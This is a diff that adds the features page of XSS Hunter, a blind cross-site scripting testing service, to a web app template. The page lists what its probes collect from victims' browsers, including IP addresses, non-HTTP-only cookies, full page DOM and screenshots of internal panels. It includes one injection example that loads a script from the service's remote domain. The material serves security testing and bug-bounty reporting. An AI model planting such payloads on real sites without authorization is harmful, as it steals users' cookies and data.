@@ -1,3 +1,197 @@
-<p>
-  features works!
-</p>
+<div class="container">
+  <div class="page-header">
+    <h1>
+      <i class="fa fa-fw fa-crosshairs"></i>
+      What is XSS Hunter?
+      <small>The Ultimate Blind XSS Exploitation Tool</small>
+    </h1>
+  </div>
+  <div class="row">
+    <div class="col-md-12">
+
+      <div class="row">
+        <div class="col-md-12">
+          XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The
+          service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable
+          page to the XSS Hunter service.
+          <br><br> Upon signing up you will create a special <code>xss.ht</code> short domain such as <code><i>yoursubdomain</i>.xss.ht</code>    which identifies your XSS vulnerabilities and hosts your payload. You then use this subdomain in your XSS testing, using
+          injection attempts such as <code>"&gt;&lt;script src=//<i>yoursubdomain</i>.xss.ht&gt;&lt;/script&gt;</code>. XSS Hunter
+          will automatically serve up XSS probes and collect the resulting information when they fire.
+        </div>
+      </div>
+      <hr />
+
+      <div class="row">
+        <div class="col-md-12">
+          <h3>Managed XSS Payload Fires</h3>
+          <div class="row">
+            <div class="col-md-4">
+              <p>
+                Easily manage all of your XSS payload fires in one spot! All vulnerabilities are recorded in your XSS Hunter control
+                panel. Even the often-missed blind XSS payload fires which occur in other victim's browsers in place such as backend
+                administrative panels, logging systems, and more are all recorded.
+              </p>
+            </div>
+            <div class="col-md-8">
+              <img class="img-responsive" src="/assets/img/manage_all_your_injections.png">
+            </div>
+          </div>
+        </div>
+      </div>
+      <hr />
+
+      <div class="row">
+        <div class="col-md-12">
+          <h3>Powerful XSS Payload Probes</h3>
+          <div class="row">
+            <div class="col-md-5">
+              All XSS Hunter payloads work as probes to gather information on where they have fired. The following information
+              is collected upon a payload firing:
+              <ul>
+                <li>The vulnerable page's URI</li>
+                <li> Origin of Execution</li>
+                <li> The Victim's IP Address</li>
+                <li> The Page Referer</li>
+                <li> The Victim's User Agent</li>
+                <li> All Non-HTTP-Only Cookies</li>
+                <li> The Page's Full HTML DOM</li>
+                <li> Full Screenshot of the Affected Page</li>
+                <li> Responsible HTTP Request (If an XSS Hunter compatible tool is used)</li>
+              </ul>
+            </div>
+            <div class="col-md-7">
+              <img class="img-responsive" src="/assets/img/automatic_page_recon.png">
+            </div>
+          </div>
+        </div>
+      </div>
+      <hr />
+
+
+      <div class="row">
+        <div class="col-md-12">
+          <h3>Full Page Screenshots</h3>
+          <div class="row">
+            <div class="col-md-4">
+              <p>
+                XSS Hunter probes utilize the HTML5 canvas API to generate a full screenshot of the vulnerable page which an XSS
+                payload has fired on. With this feature you can peak into internal administrative panels, support desks, logging systems,
+                and other internal web apps. This allows for more powerful reports that show the full impact of the vulnerability to
+                your client or bug bounty program.
+              </p>
+            </div>
+            <div class="col-md-8">
+              <img class="img-responsive" src="/assets/img/canvas_rendered_screenshots.png">
+            </div>
+          </div>
+        </div>
+      </div>
+      <hr />
+
+      <div class="row">
+        <div class="col-md-12">
+          <h3>XSS Payload Fire Email Reports</h3>
+          <div class="row">
+            <div class="col-md-5">
+              <p>
+                XSS payload fires also send out detailed email reports which can be easily forwarded to the appropriate security
+                contacts for easy reporting of critical bugs.
+              </p>
+            </div>
+            <div class="col-md-7">
+              <img class="img-responsive" src="/assets/img/report_email_alerts.png">
+            </div>
+          </div>
+        </div>
+      </div>
+      <hr />
+
+      <div class="row">
+        <div class="col-md-12">
+          <h3>Markup Report Generation</h3>
+          <div class="row">
+            <div class="col-md-4">
+              <p>
+                Speaking of powerful reporting, did we mention that each XSS payload report comes with a pre-generated markdown
+                submission for HackerOne? Collecting your bounty has never been easier. These generated reports are also compatible with
+                other markdown-supporting platforms such as Phabricator for easy bug reporting on company ticketing systems.
+              </p>
+            </div>
+            <div class="col-md-8">
+              <img class="img-responsive" src="/assets/img/easy_markdown_generation_reports.png">
+            </div>
+          </div>
+        </div>
+      </div>
+      <hr />
+
+      <div class="row">
+        <div class="col-md-12">
+          <h3>Custom XSS Shortdomain</h3>
+          <div class="row">
+            <div class="col-md-5">
+              <p>
+                Upon registering for XSS Hunter you will get your own short domain for your XSS payloads which can be used on length-restricted
+                input fields. No need to setup DNS or hosting!
+              </p>
+            </div>
+            <div class="col-md-7">
+              <img class="img-responsive" src="/assets/img/custom_xss_shortdomain.png">
+            </div>
+          </div>
+        </div>
+      </div>
+      <hr />
+
+      <div class="row">
+        <div class="col-md-12">
+          <h3>Automatic Payload Generation</h3>
+          <div class="row">
+            <div class="col-md-4">
+              <p>
+                XSS Hunter automatically generates XSS payloads for you to use in your web application security testing.
+              </p>
+            </div>
+            <div class="col-md-8">
+              <img class="img-responsive" src="/assets/img/automated_payload_generation.png">
+            </div>
+          </div>
+        </div>
+      </div>
+      <hr />
+
+      <div class="row">
+        <div class="col-md-12">
+          <h3>Correlated Injections</h3>
+          <div class="row">
+            <div class="col-md-5">
+              <p>
+                Perhaps the most powerful feature of XSS Hunter is the ability to correlated injection attempts with XSS payload
+                fires. By using an <a href="https://github.com/mandatoryprogrammer/xsshunter_client" rel="noopener" target="_blank">XSS Hunter compatible testing tool</a>
+                you can know immediately what caused a specific payload to fire (even weeks after the injection attempt was made!).
+              </p>
+            </div>
+            <div class="col-md-7">
+              <img class="img-responsive" src="/assets/img/correlated_injections.png">
+            </div>
+          </div>
+        </div>
+      </div>
+      <hr />
+
+      <div class="row">
+        <div class="col-md-12 text-center">
+          <br />
+          <a [routerLink]="['/register']" class="btn btn-primary">
+            <h3>
+              <i class="fa fa-fw fa-pencil-square"></i>
+              Convinced? Click Here to Sign Up!
+            </h3>
+          </a>
+          <br />
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
